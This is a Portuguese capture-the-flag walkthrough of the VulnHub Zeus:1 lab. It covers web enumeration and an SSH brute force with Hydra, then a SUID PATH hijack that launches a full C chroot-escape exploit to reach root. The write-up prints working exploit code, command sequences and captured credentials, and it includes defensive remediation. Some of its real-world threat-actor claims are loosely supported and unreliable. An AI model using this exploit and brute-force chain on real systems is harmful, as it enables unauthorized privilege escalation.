# VulnHub Zeus:1 — Escapando da Prisão Olímpica

Bora rapaziada!! Quem diria que um _restricted shell_ dentro de um chroot do Jailkit seria o chefe final de um CTF? Zeus:1 é uma dessas VMs que testa a paciência de um jeito muito específico: você acha as credenciais rápido, entra no SSH rápido, e aí percebe que está numa gaiola. Caramba, essa máquina me ensinou mais sobre PATH hijacking e internals de chroot do que qualquer livro que já li.

Muito obrigado ao **Vasile Revnic** por construir uma máquina que mistura conceitos reais de segurança (Jailkit, SUID, chroot escape) em um desafio boot2root muito satisfatório. Essa aqui bate diferente, mano.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Intermediário |
| **VM Alvo** | Zeus:1 |
| **VM Atacante** | Kali Linux 2019.2 |
| **VulnHub** | https://www.vulnhub.com/entry/zeus-1,598/ |
| **Técnicas** | Host discovery, Nmap, login anônimo FTP, dirb, HTML comment leak, Hydra brute force SSH, análise de Jailkit restricted shell, SUID binary PATH hijack, chroot escape (exploit C), escalação de privilégios |
| **CVEs** | CVE-2011-2523 (vsftpd 2.3.4 backdoor, presente no banner mas não é o caminho de ataque), sem CVE específica para o escape do Jailkit |

> **Dica do autor:**
> IP estático na sub-rede 192.168.131.0/24. Objetivo: ler user.txt e root.txt.

---

## Resumo do Ataque

```
[Configuração de rede VMware host-only: 192.168.131.0/24]
    |
    v
[nmap: 21/ftp (vsftpd 2.3.4), 22/ssh, 80/http (Apache 2.4.7)]
    |
    v
[Login anônimo no FTP -> sessão vazia, beco sem saída]
    |
    v
[dirb: /backups + /telecom descobertos]
    |
    v
[Código-fonte de /telecom: <!-- the website will be updated by gogu --> -> usuário: gogu]
    |
    v
[dirsearch: /backups/backups.tar.gz (criptografado GPG, armadilha)]
    |
    v
[Hydra SSH brute force: gogu:universal]
    |
    v
[Login SSH -> Jailkit restricted chroot shell (comandos limitados)]
    |
    v
[Enum do home: flag user.txt + binário SUID sysdate]
    |
    v
[cat sysdate revela chamada relativa de "date" -> oportunidade de PATH hijack]
    |
    v
[compilar unchroot.c no Kali (-static -m32), transferir via SSH]
    |
    v
[echo "/home/gogu/unchroot" > date; export PATH=/home/gogu:$PATH; ./sysdate]
    |
    v
[chroot escape executado -> shell root fora da jaula]
    |
    v
[spawn de pty python -> /root/root.txt]
```

---

## Metodologia

1. Configuração de rede: VMware host-only, estático 192.168.131.0/24
2. Enumeração de serviços com Nmap (FTP, SSH, HTTP)
3. Teste de login anônimo no FTP e enumeração da aplicação web
4. Descoberta de diretórios escondidos com dirb e dirsearch
5. Divulgação de usuário via comentário HTML do desenvolvedor em /telecom
6. Brute force SSH com Hydra no usuário gogu
7. Análise do restricted shell Jailkit e inspeção do binário SUID
8. PATH hijack: script `date` falso apontando para exploit compilado de chroot escape
9. Escalação de privilégios: chroot escape resulta em root fora da jaula

---

## Passo 1 — Configuração de Rede e Identificação do Alvo

O autor disponibiliza Zeus:1 com IP estático na sub-rede 192.168.131.0/24. Isso significa que é preciso ajustar a rede virtual do VMware antes de qualquer coisa funcionar.

No VMware Virtual Network Editor: crie ou edite uma rede host-only com Subnet IP `192.168.131.0` e Subnet Mask `255.255.255.0`. Configure tanto o Kali quanto a Zeus para usar esse adaptador host-only.

Com as duas máquinas ligadas, confirme a conectividade:

```bash
route -n
# Confirme que o Kali está em 192.168.131.x

ping 192.168.131.170
# Zeus deve responder
```

Para descobrir o IP dinamicamente (quando DHCP estiver ativo):

```bash
arp-scan --localnet --ignoredups
# ou
nmap -sn -T5 192.168.131.0/24
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Passo 2 — Reconhecimento e Enumeração de Serviços

Sem mistério aqui: scan completo de portas com detecção agressiva para ver o que o Zeus está rodando.

```bash
nmap -A -T4 -p- 192.168.131.170
# -A: detecção de OS, versão, scripts NSE, traceroute
# -T4: timing agressivo (seguro em lab isolado)
# -p-: todas as 65535 portas
```

Resultado esperado (linhas principais):

```
21/tcp open  ftp     vsftpd 2.0.8 or later (banner: v2.3.4)
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

Top demais! Três superfícies de ataque. Vamos triar:

- **FTP 21**: banner vsftpd diz 2.3.4. Essa versão é famosa pela CVE-2011-2523 (backdoor ativado por `:)` no username). Vale notar, mas o teste de login anônimo vem primeiro.
- **SSH 22**: OpenSSH 6.6.1. Sem CVE prática explorável sem credenciais.
- **HTTP 80**: Apache 2.4.7 no Ubuntu. É aqui que vamos encontrar o username.

> **Nota do mundo real:** vsftpd 2.3.4 (CVE-2011-2523) foi um backdoor inserido maliciosamente em um tarball comprometido em 2011. O backdoor abre um shell na porta 6200 quando um username terminando em `:)` é enviado. Embora presente no banner aqui, este caminho não leva ao root nesta VM. Pentesters reais sempre documentam CVEs, mesmo quando não são exploráveis no contexto específico. Referência: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1046 Network Service Discovery] [T1595.002 Active Scanning: Vulnerability Scanning]

---

## Passo 3 — Teste de Login Anônimo no FTP

O scan do Nmap já dá dica de FTP anônimo. Vamos confirmar:

```bash
ftp 192.168.131.170
# Name: ftp
# Password: ftp
```

```
230 Login successful.
Remote system type is UNIX.
ftp> ls
```

Diretório vazio. Zero loot. ಠ_ಠ

O SearchSploit também não retorna nada aproveitável para este contexto. Beco sem saída. Pivô para HTTP.

> **MITRE ATT&CK:** [T1078 Valid Accounts] [T1133 External Remote Services]

---

## Passo 4 — Enumeração Web e Divulgação de Usuário

Acesse `http://192.168.131.170`. A página inicial é suspeita: pouca coisa lá. Veja o código-fonte (Ctrl+U em qualquer browser), pois desenvolvedores adoram deixar pistas.

Nada de útil na página principal. Hora de enumeração automática de diretórios:

```bash
dirb http://192.168.131.170 /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
# Wordlist curta para vitórias rápidas primeiro
```

Descoberta esperada:

```
+ http://192.168.131.170/backups (CODE:301)
+ http://192.168.131.170/telecom (CODE:301)
```

Ixi, dois diretórios escondidos! Acesse ambos:

- `/backups`: renderiza vazio, código-fonte também.
- `/telecom`: nada visível. Mas o **código-fonte** entrega tudo:

```html
<!-- the website will be updated by gogu -->
```

Jackpot! Temos um username: **gogu**. ( ͡° ͜ʖ ͡°)

> **O que é information disclosure via comentários HTML?**
> Desenvolvedores às vezes deixam comentários no HTML para uso interno: notas TODO, usernames, caminhos internos ou endpoints de API. Esses comentários são invisíveis no browser mas trivialmente visíveis no código-fonte. O OWASP classifica isso em A05:2021 Security Misconfiguration.
> Referência: https://owasp.org/www-project-top-ten/

Agora busque mais fundo em `/backups`:

```bash
dirsearch -u http://192.168.131.170/backups -x 403,404,500 -e php,html,txt,jpg,gif,png,zip,tar,gz -rR 5
```

Encontra `backups.tar.gz`. Baixe e tente extrair:

```bash
tar -xzvf backups.tar.gz
# gzip: stdin: not in gzip format
```

```bash
file backups.tar.gz
# backups.tar.gz: GPG symmetrically encrypted data (AES256 cipher)
```

Vacilou feio! Criptografado com GPG. Isso é uma armadilha. (⊙_☉) O MD5 do user.txt decodifica para `1092124305` mas também não decripta o backup. Armadilha clássica de CTF: este arquivo existe puramente para desperdiçar seu tempo.

**Dica:** também pode usar `gobuster dir -u http://192.168.131.170 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` no lugar do dirb para o mesmo resultado.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1083 File and Directory Discovery]

---

## Passo 5 — Brute Force SSH

Temos um username: `gogu`. Hora de atacar o SSH com a lendária wordlist rockyou.

```bash
hydra -l gogu -P /usr/share/wordlists/rockyou.txt 192.168.131.170 ssh -I -F
# -l: username único
# -P: wordlist de senhas
# -I: ignora arquivo de restore existente
# -F: para no primeiro resultado válido
```

Resultado esperado:

```
[22][ssh] host: 192.168.131.170   login: gogu   password: universal
```

**Credenciais: gogu:universal** ᕕ( ᐛ )ᕗ

Você também pode usar o Medusa como alternativa:

```bash
medusa -h 192.168.131.170 -u gogu -P /usr/share/wordlists/rockyou.txt -M ssh
```

> **Nota do mundo real:** Brute force SSH com credential stuffing é uma ocorrência diária. O APT41 (ator de ameaça chinês atribuído a operações patrocinadas pelo estado) usa regularmente brute force SSH contra serviços administrativos expostos como parte das operações de acesso inicial. Referência: https://attack.mitre.org/groups/G0096/

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1110.003 Brute Force: Password Spraying] [TA0001 Initial Access] [T1021.004 Remote Services: SSH]

---

## Passo 6 — Acesso Inicial: Jailkit Restricted Shell

```bash
ssh gogu@192.168.131.170
# Password: universal
```

Entramos! Mas algo está errado. ლ(ಠ_ಠლ)

Tente rodar comandos básicos:

```bash
id
# -rbash: id: command not found

python
# not found
```

Mas funcionam: `ls`, `cat`, `cd`, `echo`. Estamos dentro de um **Jailkit restricted shell** (chroot jail).

```bash
cat /etc/passwd
# apenas root e gogu
```

A prova:

```bash
ls /etc/
# ...
# jailkit  <- aí está
```

> **O que é Jailkit?**
> Jailkit é um conjunto de utilitários que limita contas de usuário a arquivos específicos usando `chroot()`. Ele cria um ambiente secundário (a "jaula") com um conjunto mínimo de binários, impedindo o usuário preso de acessar o sistema real. É usado em produção por ISPs, gateways SSH corporativos e dispositivos de segurança embarcados.
> Referência: https://olivier.sessink.nl/jailkit/

Enumere o que temos dentro da jaula:

```bash
ls -la ~
# user.txt
# hackme (binário suspeito, provavelmente armadilha)
# ..../sysdate (escondido em um diretório "...")
```

Leia a primeira flag:

```bash
cat ~/user.txt
# 153a1d7d664309c3c3a553a06633ab5c
```

O binário `hackme`: testei, rodei, não produz nada útil. Armadilha pura. (⊙_☉) Seguindo em frente.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1082 System Information Discovery]

---

## Passo 7 — Descoberta do Binário SUID e Análise de PATH Hijack

No diretório oculto `~/...`, há um binário SUID chamado `sysdate`.

```bash
ls -la ~/...
# ---s--x--x  1 root root   sysdate
```

Esse `-s` significa SUID: executa como root independentemente de quem o execute.

O que ele faz? Pô, não temos `strings` na jaula, mas `cat` funciona e pode vazar strings de binários:

```bash
cat ~/.../.../sysdate
# ...binário embaralhado...
# ...date | grep EEST...
```

A string `date` aparece **sem caminho absoluto**. Isso significa que `sysdate` chama o binário `date` por **nome relativo**, confiando no que a variável `$PATH` resolver primeiro.

Para confirmar pelo Kali (transfira o binário para fora):

```bash
# Na jaula:
ssh root@192.168.131.128 "cat > sysdate" < /home/gogu/.../sysdate

# No Kali, analise:
strings sysdate | grep date
# date | grep EEST
```

Confirmado. O binário chama `date` de forma relativa. Esse é o nosso vetor de escalação. ( ͡° ͜ʖ ͡°)

> **O que é PATH hijacking?**
> Quando um programa chama outro binário pelo nome curto (ex: `date` em vez de `/bin/date`), o SO pesquisa cada diretório listado na variável de ambiente `$PATH` em ordem. Se um atacante controla um diretório que aparece primeiro no `$PATH`, pode colocar um script malicioso chamado `date` lá. O binário SUID executará o script do atacante com privilégios elevados.
> Referência: https://attack.mitre.org/techniques/T1574/007/

> **Nota do mundo real:** PATH hijacking via binários SUID está documentado em múltiplos comprometimentos de Linux corporativo. O FIN7, ator de ameaça com motivação financeira, usou manipulação de PATH como parte da escalação de privilégios pós-exploração em hosts Linux. Referência: https://attack.mitre.org/groups/G0046/

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1574.007 Path Interception by PATH Environment Variable] [T1548.001 Abuse Elevation Control Mechanism: Setuid and Setgid]

---

## Passo 8 — Compilando o Exploit de Chroot Escape

Antes do PATH hijack, precisamos de algo que realmente quebre a jaula chroot. Um `/bin/sh -i` simples via PATH hijack ainda daria um shell root _dentro da jaula_.

Precisamos da técnica de chroot escape: um programa C que usa `chroot()` + `chdir("..")` para subir acima do root da jaula e então respawna `/bin/sh` no filesystem real.

Na sua **máquina Kali** (não dentro da jaula), crie o exploit:

```bash
vi unchroot.c
```

```c
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
    int dir_fd, x;
    setuid(0);
    mkdir(".42", 0755);
    dir_fd = open(".", O_RDONLY);
    chroot(".42");
    fchdir(dir_fd);
    close(dir_fd);
    for(x = 0; x < 1000; x++) chdir("..");
    chroot(".");
    return execl("/bin/sh", "-i", NULL);
}
```

Compile como binário estático 32-bit (corresponde à arquitetura do alvo):

```bash
gcc -static -o unchroot unchroot.c -m32
# -static: sem dependências de bibliotecas compartilhadas (funciona em ambiente minimal)
# -m32: alvo é Linux 32-bit
```

> **MITRE ATT&CK:** [T1059.004 Command and Scripting Interpreter: Unix Shell]

---

## Passo 9 — Transferindo o Exploit para o Alvo

Dois métodos. Use o que funcionar melhor no seu ambiente:

**Método 1: Redirecionamento stdin via SSH (mais simples)**

```bash
# No Kali (atacante), redirecione o binário pelo SSH:
ssh gogu@192.168.131.170 "cat > unchroot" < unchroot
```

**Método 2: cpio via SSH**

```bash
find ./unchroot -xdev -print | cpio -o -Bav -H crc | ssh gogu@192.168.131.170 'pwd; cpio -i -vumd'
```

Dentro da jaula, verifique e dê permissão de execução:

```bash
ls -la ~/unchroot
chmod +x ~/unchroot
```

> **MITRE ATT&CK:** [T1105 Ingress Tool Transfer]

---

## Passo 10 — PATH Hijack: Escape da Jaula e Root

Agora junte tudo. Três comandos:

```bash
# 1. Crie um script "date" falso que executa nosso exploit unchroot
echo "/home/gogu/unchroot" > /home/gogu/date

# 2. Torne executável e adicione nosso diretório ao início do PATH
chmod +x /home/gogu/date
export PATH=/home/gogu:$PATH

# 3. Execute o binário SUID: ele chama "date", encontra o nosso falso, executa unchroot como root
/home/gogu/.../sysdate
```

Se a saída stdout estiver estranha, acrescente `1<&2`:

```bash
/home/gogu/.../sysdate 1<&2
```

(☞ﾟヮﾟ)☞ **Root fora da jaula!**

Spawn de um PTY adequado para conforto:

```bash
python -c "import pty; pty.spawn('/bin/bash')" 1<&2
```

Leia a flag root:

```bash
cat /root/root.txt
```

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.001 Setuid and Setgid] [T1574.007 Path Interception by PATH Environment Variable] [T1611 Escape to Host]

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Onde Encontrado | Crackeado/Usado |
|------|-------|-----------------|----------------|
| Flag 1 (MD5) | `153a1d7d664309c3c3a553a06633ab5c` | `~/user.txt` | Decodifica para `1092124305` (não usado no caminho de exploração) |
| Credencial | `gogu:universal` | Hydra SSH brute force | Login SSH |
| Flag root | Ver `/root/root.txt` | `/root/root.txt` | Objetivo final |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|----------------|
| 1 | Username divulgado em comentário HTML | Notas de desenvolvedor em código de produção expõem usernames para brute force direcionado | Remover todos os comentários e informações de debug do HTML antes de deploy |
| 2 | Senha SSH fraca (`universal`) | Password spraying/brute force é uma das técnicas de acesso inicial mais comuns contra SSH exposto | Exigir senhas fortes, usar autenticação por chave, considerar fail2ban ou port knocking |
| 3 | Binário SUID chamando `date` por caminho relativo | Qualquer SUID chamando ferramentas externas por nome relativo é risco de escalação em qualquer host Linux | Sempre usar caminhos absolutos em programas SUID/sudo-acessíveis |
| 4 | Chroot escape do Jailkit via loop `chdir("..")` | Chroot sozinho não é uma fronteira de segurança: sem sandboxing de processo adequado, pode ser escapado | Combinar chroot com seccomp, AppArmor ou isolamento de container para defesa em profundidade |

**Por que isso importa fora do lab?**

Brute force SSH representa uma porcentagem significativa de acessos iniciais em comprometimentos reais. Os ataques relacionados ao SolarWinds em 2021 e vários grupos de ransomware (LockBit, BlackCat) usam SSH exposto com credenciais fracas como entrada do dia um. A técnica de escape do Jailkit mapeia diretamente para problemas CVE em produtos de restricted shell: vários dispositivos de rede comerciais foram entregues com ambientes SSH em jaula que podiam ser escapados usando exatamente este método `chdir`. Para blue teams: Jailkit é usado legitimamente por ISPs e gateways SSH corporativos. Se você encontrá-lo em um scan de rede, investigue.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconhecimento | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Descoberta | TA0007 | Network Service Discovery | T1046 |
| Descoberta | TA0007 | File and Directory Discovery | T1083 |
| Acesso a Credenciais | TA0006 | Brute Force: Password Spraying | T1110.003 |
| Acesso Inicial | TA0001 | External Remote Services (SSH) | T1133 |
| Execução | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Evasão de Defesas | TA0005 | Path Interception by PATH Environment Variable | T1574.007 |
| Escalação de Privilégios | TA0004 | Setuid and Setgid | T1548.001 |
| Escalação de Privilégios | TA0004 | Path Interception by PATH Environment Variable | T1574.007 |
| Escalação de Privilégios | TA0004 | Escape to Host | T1611 |
| Coleta | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Remover todos os comentários de desenvolvedor, usernames e caminhos internos do HTML de produção antes do deploy.
2. Exigir senhas SSH fortes ou, melhor ainda, desabilitar autenticação por senha e usar autenticação por chave.
3. Substituir o binário SUID `sysdate` para chamar `/bin/date` (caminho absoluto) em vez de `date`.
4. Manter o Jailkit atualizado e combinar com perfis `seccomp` ou AppArmor para evitar chamadas de sistema `chroot()` por processos na jaula.
5. Auditar todos os binários SUID regularmente: `find / -perm -u=s -type f 2>/dev/null` deve fazer parte de todo runbook de hardening Linux.

### Se Você Encontrar Algo Similar no Seu Ambiente

**Contenção imediata:**
- Isole o host da rede se compromentimento ativo for suspeito.
- Rotacione credenciais de qualquer conta que possa ter sido atacada por brute force.
- Revise logs de autenticação SSH para falhas repetidas: `grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn`.
- Audite todos os binários SUID no host.

**Contramedidas MITRE D3FEND:**
- D3-MFA (Multi-factor Authentication) para T1110.003 Brute Force
- D3-IVA (Input Validation) para caminhos T1059.004
- D3-OPS (OS Process Sandboxing) para T1548.001 SUID Abuse
- D3-DA (Dynamic Analysis) para T1574.007 PATH Hijacking

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identificar (ID.AM): Inventariar todos os binários SUID e contas acessíveis via SSH.
- Proteger (PR.AC-4): Implementar gerenciamento de acesso privilegiado; exigir MFA para SSH.
- Detectar (DE.CM-1): Monitorar logs de autenticação para padrões de brute force.
- Responder (RS.AN): Investigar eventos de acesso root com reconstrução de linha do tempo forense.
- Recuperar (RC.RP): Rotacionar credenciais e reconstruir sistemas afetados após comprometimento confirmado.

**NIST SP 800-53 (Rev. 5):**
- IA-5: Gerenciamento de Autenticação (exigir senhas SSH fortes ou chaves)
- AC-6: Menor Privilégio (remover bits SUID desnecessários)
- SI-2: Remediação de Falhas (manter vsftpd e Jailkit atualizados)
- AU-2: Log de Eventos (registrar tentativas de autenticação SSH)
- CM-7: Funcionalidade Mínima (desabilitar FTP anônimo se não utilizado)

**CISA Known Exploited Vulnerabilities:**
- CVE-2011-2523 (vsftpd 2.3.4 backdoor): presente no catálogo KEV da CISA. Não é o caminho de ataque aqui, mas a versão do serviço justifica atualização imediata.
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: ACCESS
- Prática: Identity and Access Management
- MIL Alvo: MIL-2 (controles de acesso gerenciados, autenticação multifator, revisões regulares de acesso)

---

## Considerações Finais

Muito obrigado ao **Vasile Revnic** por criar Zeus:1 com camadas que realmente ensinam algo! O backup GPG como armadilha é uma trollagem criativa. A combinação Jailkit + PATH hijack SUID é legitimamente algo que você encontraria em um jumpbox SSH endurecido ou em um servidor shell de ISP.

Tá ligado? Esta VM é uma aula magistral em um princípio central: um ambiente restrito é tão forte quanto cada binário dentro dele. Uma única chamada de caminho relativo em um binário SUID é tudo que é preciso para desfazer tudo. Para quem estuda para certificação LPI: conceitos de chroot e Jailkit aparecem nos objetivos do exame, então esta VM serve como material de estudo prático.

Se este walkthrough te ajudou, compartilha com a galera e continua hackando. top demais gg

*Thanks guys!! (❍ᴥ❍ʋ)*

> Artigo original em português de André Henrique: https://medium.com/uniaogeek/vulnhub-zeus-1-walkthrough

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
